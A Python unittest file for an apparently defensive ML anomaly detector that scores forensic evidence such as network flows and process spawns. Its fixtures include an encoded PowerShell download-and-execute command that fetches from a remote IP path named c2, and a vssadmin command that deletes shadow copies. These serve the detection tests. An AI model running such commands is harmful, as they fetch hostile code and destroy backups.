"""
MongoTrace Machine Learning Pipeline Verification & Test Suite
Validates model artifacts, inference accuracy on forensic evidence cases,
and verifies FastAPI prediction logic directly.
"""

import sys
import unittest

from .api import health, model_info, predict, predict_batch, EvidenceInput, BatchEvidenceInput
from .feature_extractor import extract_from_evidence_doc
from .dataset_loader import get_dataset_metadata

class TestMLPipeline(unittest.TestCase):

    def test_01_health_function(self):
        """Verify health check and model loading state."""
        data = health()
        self.assertEqual(data["status"], "ONLINE")
        self.assertTrue(data["model_loaded"])
        self.assertTrue(data["scaler_loaded"])
        self.assertEqual(len(data["features"]), 9)

    def test_02_model_info_function(self):
        """Verify model metadata and empirical metrics."""
        data = model_info()
        self.assertEqual(data["model_type"], "IsolationForest")
        metrics = data["metrics"]
        self.assertGreater(metrics["f1_score"], 0.85)
        self.assertGreater(metrics["accuracy"], 0.90)
        self.assertGreater(metrics["roc_auc"], 0.90)

    def test_03_benign_evidence_scoring(self):
        """Test scoring of normal enterprise evidence (expected: benign, low anomaly score)."""
        benign_input = EvidenceInput(
            evidenceId="EV-TEST-BENIGN",
            title="Standard HTTPS Web Access to Internal Portal",
            artifactType="NETWORK_FLOW",
            severity="LOW",
            sourceHost="ws-eng-01.corp.lan",
            timestamp="2026-10-14T11:30:00Z",  # Business hours
            metadata={
                "port": 443,
                "bytesTransferred": 4096,
                "duration": 0.5,
                "connCount": 2,
                "failedLogins": 0
            }
        )
        result = predict(benign_input)
        self.assertFalse(result.is_anomaly, "Benign enterprise telemetry should not be flagged as anomaly.")
        self.assertLess(result.anomaly_score, 0.50, f"Expected anomaly_score < 0.50, got {result.anomaly_score}")
        self.assertEqual(result.threat_level, "LOW")

    def test_04_data_exfiltration_anomaly_detection(self):
        """Test anomaly detection on mass data exfiltration (Project Chimera archetype)."""
        exfil_input = EvidenceInput(
            evidenceId="EV-TEST-EXFIL",
            title="Off-Hours Mass Archive Exfiltration over Removable Media",
            artifactType="FILE_INTEGRITY",
            severity="CRITICAL",
            sourceHost="ws-eng-88.corp.lan",
            timestamp="2026-10-14T02:15:00Z",  # 2:15 AM off-hours
            description="Proprietary autonomous driving CAD repositories cloned and compressed into 7z archive.",
            metadata={
                "port": 443,
                "bytesTransferred": 28500000,  # 28.5 MB
                "duration": 180.0,
                "filePath": "E:\\Confidential_Patents_Export_2026.7z",
                "sha256": "8f4e2b1a9c3d5e7f0b2a4c6e8d0f1a3b5c7e9f1a3b5c7e9f1a3b5c7e9f1a3b5c"
            }
        )
        result = predict(exfil_input)
        self.assertTrue(result.is_anomaly, "Mass exfiltration event must be detected as anomaly.")
        self.assertGreater(result.anomaly_score, 0.55, f"Expected anomaly_score > 0.55, got {result.anomaly_score}")
        self.assertIn(result.threat_level, ["HIGH", "CRITICAL"])
        self.assertTrue(len(result.top_contributing_features) > 0)

    def test_05_living_off_the_land_detection(self):
        """Test anomaly detection on LOLBAS execution chain (APT29 archetype)."""
        lotl_input = EvidenceInput(
            evidenceId="EV-TEST-LOTL",
            title="Encoded PowerShell Ingress & Token Extraction",
            artifactType="PROCESS_SPAWN",
            severity="CRITICAL",
            sourceHost="dc01.corp.lan",
            timestamp="2026-10-14T03:00:00Z",
            metadata={
                "processName": "powershell.exe",
                "commandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk0Ljg3LjEzOS4yNC9jMiddKQ==",
                "parentProcessName": "wmic.exe",
                "connCount": 45,
                "port": 8443
            }
        )
        result = predict(lotl_input)
        self.assertTrue(result.is_anomaly, "Encoded LOLBAS execution must be flagged as anomaly.")
        self.assertGreater(result.anomaly_score, 0.55)
        self.assertIn(result.threat_level, ["HIGH", "CRITICAL"])

    def test_06_batch_prediction_logic(self):
        """Test batch inference with multiple mixed items."""
        batch = BatchEvidenceInput(
            items=[
                EvidenceInput(
                    evidenceId="EV-B1",
                    title="Normal DNS lookup",
                    metadata={"port": 53, "bytesTransferred": 128, "duration": 0.05}
                ),
                EvidenceInput(
                    evidenceId="EV-B2",
                    title="Mass Vssadmin Shadow Deletion Burst",
                    metadata={"commandLine": "vssadmin.exe delete shadows /all /quiet", "connCount": 95, "port": 445}
                )
            ]
        )
        data = predict_batch(batch)
        self.assertEqual(data["total_evaluated"], 2)
        self.assertEqual(data["anomalies_detected"], 1)
        self.assertEqual(data["normal_count"], 1)

def run_tests():
    suite = unittest.TestLoader().loadTestsFromTestCase(TestMLPipeline)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
